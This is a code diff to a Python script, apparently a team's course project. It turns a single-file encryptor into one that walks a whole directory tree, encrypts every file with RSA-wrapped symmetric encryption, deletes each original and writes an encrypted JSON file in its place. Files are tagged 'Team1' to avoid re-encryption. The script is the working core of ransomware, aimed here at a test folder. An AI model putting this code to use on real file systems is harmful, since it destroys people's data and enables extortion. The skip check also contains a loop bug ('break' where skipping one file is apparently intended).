@@ -6,12 +6,8 @@ from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import (hashes, hmac, serialization)
 from cryptography.hazmat.primitives import (padding, asymmetric)
 
-### Toggle Comment For PNG, JPG, or TXT File ###
-#fileToEncrypt = './TestFiles/Images/image.png'
-fileToEncrypt = './TestFiles/Images/image.jpg'
-#fileToEncrypt = './TestFiles/Text/test.txt'
 
-
+rootDirectory = "./TestFiles/EncryptThese"
 rsa_public_key_file_path = "./KeyFiles/public.pem"
 rsa_private_key_file_path = "./KeyFiles/private.pem"
 
@@ -19,9 +15,8 @@ rsa_private_key_file_path = "./KeyFiles/private.pem"
 def check_rsa_keys():
     public_exists = os.path.isfile(rsa_public_key_file_path)
     private_exists = os.path.isfile(rsa_private_key_file_path)
-    file_exists = os.path.isfile(fileToEncrypt)
 
-    if public_exists and private_exists and file_exists:
+    if public_exists and private_exists:
         # Tells User that PEM Files Exist
         print("PEM Files Exist")
     else:
@@ -54,21 +49,43 @@ def check_rsa_keys():
         public_key_file_path.write(public_pem)
         public_key_file_path.close()
 
-
 def encDirectory(directory):
-    # Check for or create RSA keys
+    # Check that the keys exist or create them
     check_rsa_keys()
-
+    # Walk the directory and encrypt everything
     for dirName, subdirList, fileList in os.walk(directory):
         for fileToEncrypt in fileList:
-            RSACipher, cit, iv, tag, ext = MyRSAEncrypt(os.path.join(dirName, fileToEncrypt).replace("\\","/"), rsa_public_key_file_path)
+            # Get the next file
+            filepath = os.path.join(dirName, fileToEncrypt).replace("\\", "/")
+            # If it's a JSON, check if we encrypted it already
+            if(getExtension(filepath) == '.json' and didWeEncrypt(filepath)):
+                # We encrypted it already
+                break
+
+            # Anything that reaches here was not encrypted by us yet, so encrypt it
+            RSACipher, cit, iv, tag, ext = MyRSAEncrypt(filepath, rsa_public_key_file_path)
             # Create and dump the JSON data into the object
             jsonObj = createJSON(cit, tag, iv, ext, RSACipher)
             # Delete original file
-            os.remove(os.path.join(dirName, fileToEncrypt).replace("\\","/"))
+            os.remove(filepath)
             # Create encrypted json file named the same as the original file with different extension
             fileName = os.path.splitext(fileToEncrypt)[0] + ".json"
-            createFile(os.path.join(dirName, fileName).replace("\\","/"), jsonObj)
+            createFile(os.path.join(dirName, fileName).replace("\\", "/"), jsonObj)
+
+# This function returns 0/1 depending on if we have already encrypted the filepath given
+def didWeEncrypt(filepath):
+    file = open(filepath, "r")
+    jsonContents = json.load(file)  # result is now a dict
+    try:
+        if(jsonContents['createdBy'] == 'Team1'):
+            # We did
+            return 1
+        else:
+            # We didn't because createdBy != 'Team1'
+            return 0
+    except:
+        # We didn't because createdBy doesn't exist
+        return 0
 
 def MyRSAEncrypt(filepath, RSA_Publickey_filepath):
     # Encrypt the file
@@ -216,4 +233,17 @@ def createFile(fileName, jsonObj):
     f.write(jsonObj)
     f.close()
 
-encDirectory('./TestFiles/EncryptThese')
+
+
+name = """   _______        _         
+ |__   __|      | |        
+    | | _____  _| |_       
+    | |/ _ \ \/ / __|      
+    | |  __/>  <| |_ _ _ _ 
+    |_|\___/_/\_\\__(_|_|_)
+                           
+                           
+"""
+
+
+encDirectory(rootDirectory)
